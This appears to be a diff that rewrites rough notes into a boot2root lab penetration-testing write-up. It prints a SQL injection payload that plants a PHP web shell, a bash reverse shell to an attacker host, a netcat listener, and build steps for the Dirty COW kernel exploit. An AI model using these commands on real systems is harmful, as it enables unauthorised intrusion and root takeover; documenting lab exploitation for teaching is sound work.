@@ -1,25 +1,151 @@
-https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt
+# Boot2Root Penetration Testing Writeup
 
+## Overview
+This writeup documents the process of achieving root access on a vulnerable boot2root virtual machine. The exploitation chain involves web application enumeration, SQL injection, reverse shell establishment, and privilege escalation using a kernel exploit.
+
+---
+
+## Environment Setup
+
+### Virtual Machine Configuration
+The target machine was configured with a host-only network adapter for isolated testing:
+
+```bash
 VBoxManage modifyvm "boot2root" --nic2 hostonly --hostonlyadapter2 vboxnet0
 VBoxManage startvm "boot2root" --type headless
+```
 
-# command
-SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/forum/templates_c/shell.php'; 
+This setup ensures the vulnerable machine is accessible only from the attacking machine on the isolated network (vboxnet0).
 
-# test if injection is done
- curl --insecure 'https://192.168.56.102/forum/templates_c/shell.php?cmd=ls%20-la'
+---
 
-#REVERS SHELL 
+## Reconnaissance & Enumeration
+
+### Directory Enumeration
+Using the common.txt wordlist from the dirb project, I enumerated web directories to identify potential attack surfaces:
+
+**Wordlist Source:** `https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt`
+
+This revealed a forum application accessible on the target system.
+
+---
+
+## Exploitation Phase
+
+### Step 1: SQL Injection to Web Shell
+
+The forum application was found to be vulnerable to SQL injection. I exploited this vulnerability to write a PHP web shell to the web-accessible directory:
+
+**SQL Injection Payload:**
+```sql
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/forum/templates_c/shell.php';
+```
+
+This command creates a simple PHP web shell that accepts commands via the `cmd` GET parameter.
+
+### Step 2: Web Shell Verification
+
+To confirm the injection was successful, I tested the web shell:
+
+```bash
+curl --insecure 'https://192.168.56.102/forum/templates_c/shell.php?cmd=ls%20-la'
+```
+
+The `--insecure` flag was necessary to bypass SSL certificate validation. The successful response confirmed remote code execution capability.
+
+### Step 3: Reverse Shell Establishment
+
+With confirmed RCE, I established a reverse shell connection back to my attacking machine:
+
+**On the attacking machine (listener):**
+```bash
+nc -lvnp 4444
+```
+
+**Reverse shell payload:**
+```bash
 curl --insecure 'https://192.168.56.102/forum/templates_c/shell.php?cmd=bash%20-c%20%27sh%20-i%20>%26%20/dev/tcp/192.168.56.1/4444%200>%261%27'
+```
 
-nc -lvnp 4444 
+This command initiates a bash reverse shell that connects back to 192.168.56.1 (attacking machine) on port 4444.
 
-https://www.exploit-db.com/
+### Step 4: Shell Upgrade
 
-lsb_release -d --> https://github.com/nirae/boot2root/blob/master/scripts/dirty.c 
+After obtaining the initial reverse shell, I upgraded to a more functional TTY shell:
 
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+This provides a more stable and interactive shell environment with proper terminal emulation.
+
+---
+
+## Privilege Escalation
+
+### System Reconnaissance
+
+I identified the system version to search for known kernel exploits:
+
+```bash
+lsb_release -d
+```
+
+### Exploit Research
+
+Using the system information, I searched Exploit-DB (`https://www.exploit-db.com/`) and identified the "Dirty COW" privilege escalation exploit as applicable to this kernel version.
+
+**Exploit Source:** `https://github.com/nirae/boot2root/blob/master/scripts/dirty.c`
+
+### Exploitation
+
+**Compilation:**
+```bash
 gcc -pthread dirty.c -o dirty -lcrypt
+```
 
+The exploit requires the pthread library for thread manipulation and lcrypt for password handling.
+
+**Execution:**
+```bash
 ./dirty
+```
 
-python -c 'import pty; pty.spawn("/bin/bash")' 
+The Dirty COW exploit leverages a race condition in the Linux kernel's memory subsystem (CVE-2016-5195) to gain write access to read-only memory mappings, ultimately providing root privileges.
+
+---
+
+## Success
+
+After executing the Dirty COW exploit, root access was successfully obtained on the target system.
+
+---
+
+## Vulnerability Summary
+
+1. **SQL Injection** - Allowed file write capability through OUTFILE
+2. **Insecure File Permissions** - Web-writable templates directory
+3. **Outdated Kernel** - Vulnerable to CVE-2016-5195 (Dirty COW)
+
+## Recommendations
+
+- Sanitize all user inputs to prevent SQL injection
+- Apply principle of least privilege to file system permissions
+- Keep system kernel and packages updated with security patches
+- Implement web application firewalls (WAF)
+- Regular security audits and penetration testing
+
+---
+
+## Tools Used
+
+- VirtualBox (Virtual Machine Management)
+- dirb wordlist (Directory enumeration)
+- curl (HTTP requests and exploitation)
+- netcat (Reverse shell listener)
+- gcc (Exploit compilation)
+- Dirty COW exploit (Privilege escalation)
+
+---
+
+**Disclaimer:** This penetration test was conducted in a controlled environment for educational purposes. Unauthorized access to computer systems is illegal.
